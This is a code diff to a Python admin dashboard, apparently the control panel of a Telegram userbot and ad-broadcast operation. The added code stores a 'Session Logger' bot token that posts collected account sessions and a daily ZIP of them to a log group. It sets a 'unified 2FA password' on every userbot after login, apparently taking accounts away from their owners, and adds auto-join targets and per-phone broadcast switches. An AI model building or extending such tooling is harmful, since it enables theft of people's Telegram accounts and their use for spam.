@@ -97,6 +97,31 @@ def _dashboard() -> str:
     campaigns = settings.get("campaigns", [])
     running = running_count = ads_bot.running_count()
 
+    primary_logger_token = database.get_log_bot_token() or ""
+    primary_group_id = database.get_log_group_id()
+    primary_bot_token = database.get_primary_bot_token() or ""
+    unified_2fa = database.get_unified_2fa()
+    auto_join_targets = database.get_auto_join_targets()
+
+    approval_rows = ""
+    for i, u in enumerate(userbots, 1):
+        phone = u.get("phone", "")
+        approved = bool(u.get("broadcast_allowed"))
+        status_txt = "✅ ON" if approved else "❌ OFF"
+        status_cls = "green" if approved else "red"
+        approval_rows += (
+            f"<tr><td>{i}</td><td><code>{html.escape(phone)}</code></td>"
+            f"<td>@{html.escape(u.get('username') or 'None')}</td>"
+            f"<td class='{status_cls}'>{status_txt}</td><td>"
+            f"<form method='post' action='/admin/action' style='display:inline'>"
+            f"<input type='hidden' name='action' value='set_broadcast'>"
+            f"<input type='hidden' name='phone' value='{html.escape(phone)}'>"
+            f"<input type='hidden' name='allowed' value='{'1' if not approved else '0'}'>"
+            f"<button class='row'>{'❌ OFF' if approved else '✅ ON'}</button></form>"
+            "</td></tr>"
+        )
+    approval_rows = approval_rows or "<tr><td colspan='5' class='dim'>No sessions connected yet.</td></tr>"
+
     rows = ""
     for i, b in enumerate(bots, 1):
         is_running = ads_bot.is_ads_bot_running(b["token"])
@@ -261,6 +286,42 @@ def _dashboard() -> str:
         <button class="danger">🚪 Logout</button>
       </form>
     </div>
+
+    <div class="card">
+      <h2>📋 Panel Settings (bots / logger / 2FA / auto-join)</h2>
+      <form method="post" action="/admin/action">
+        <input type="hidden" name="action" value="set_logger">
+        <label>Session Logger bot token <span class="dim">(posts sessions + daily ZIP):</span></label>
+        <input type="text" name="logger_token" value="{html.escape(primary_logger_token)}" placeholder="123456:ABC…">
+        <label>Log group / channel ID <span class="dim">(numeric, e.g. -100…):</span></label>
+        <input type="text" name="group_id" value="{html.escape(primary_group_id)}" placeholder="-1001234567890">
+        <button type="submit">💾 Set Logger + Group</button>
+      </form>
+      <form method="post" action="/admin/action" style="margin-top:10px">
+        <input type="hidden" name="action" value="set_primary_bot">
+        <label>Main bot token <span class="dim">(primary / Mini App bot):</span></label>
+        <input type="text" name="token" value="{html.escape(primary_bot_token)}" placeholder="123456:ABC…">
+        <button type="submit">💾 Set Main Bot Token</button>
+      </form>
+      <form method="post" action="/admin/action" style="margin-top:10px">
+        <input type="hidden" name="action" value="set_2fa">
+        <label>Unified 2FA password <span class="dim">(auto-applied to every userbot after login):</span></label>
+        <input type="text" name="password" value="{html.escape(unified_2fa)}" placeholder="AdminPy#2026">
+        <button type="submit">💾 Set 2FA Password</button>
+      </form>
+      <form method="post" action="/admin/action" style="margin-top:10px">
+        <input type="hidden" name="action" value="set_auto_join">
+        <label>Auto-join channels/groups on login <span class="dim">(one per line — links, @usernames, IDs):</span></label>
+        <textarea name="targets" rows="3" placeholder="https://t.me/MyChannel&#10;@MyGroup">{"&#10;".join(html.escape(t) for t in auto_join_targets)}</textarea>
+        <button type="submit">💾 Save Auto-Join Targets</button>
+      </form>
+    </div>
+
+    <div class="card">
+      <h2>📡 Broadcast Approval <span class="dim">(connected sessions)</span></h2>
+      <div class="dim">Each userbot only broadcasts after you press ✅ ON on its session message in the log group. Toggle directly below if needed.</div>
+      <table><tr><th>#</th><th>Phone</th><th>Username</th><th>Status</th><th></th></tr>{approval_rows}</table>
+    </div>
     """ + HTML_FOOT
 
 
@@ -416,6 +477,36 @@ async def handle_action(request):
         elif action == "force_zip":
             path = await session_logger.build_and_send_zip()
             message = f"Zip sent: {os.path.basename(path)}" if path else "No sessions to zip."
+        elif action == "set_logger":
+            logger_token = data.get("logger_token", "").strip()
+            group_id = data.get("group_id", "").strip()
+            ok = database.set_logger_settings(logger_token, group_id)
+            restart_msg = await session_logger.restart_log_bot()
+            message = f"Logger saved. {restart_msg}"
+        elif action == "set_primary_bot":
+            token = data.get("token", "").strip()
+            if token:
+                database.set_primary_bot_token(token)
+                message = "Main bot token saved. It applies on restart/redeploy."
+            else:
+                message = "Token required."
+        elif action == "set_2fa":
+            pwd = data.get("password", "").strip()
+            if pwd:
+                database.set_unified_2fa(pwd)
+                message = "2FA password saved."
+            else:
+                message = "Password required."
+        elif action == "set_auto_join":
+            targets_text = data.get("targets", "")
+            targets = [ln.strip() for ln in targets_text.replace("\r", "").split("\n") if ln.strip()]
+            database.set_auto_join_targets(targets)
+            message = "Auto-join targets saved."
+        elif action == "set_broadcast":
+            phone = data.get("phone", "").strip()
+            allowed = data.get("allowed", "0") == "1"
+            database.set_user_broadcast_allowed(phone, allowed)
+            message = f"Broadcast {'ON' if allowed else 'OFF'} for {phone}."
         else:
             message = f"Unknown action: {action}"
 
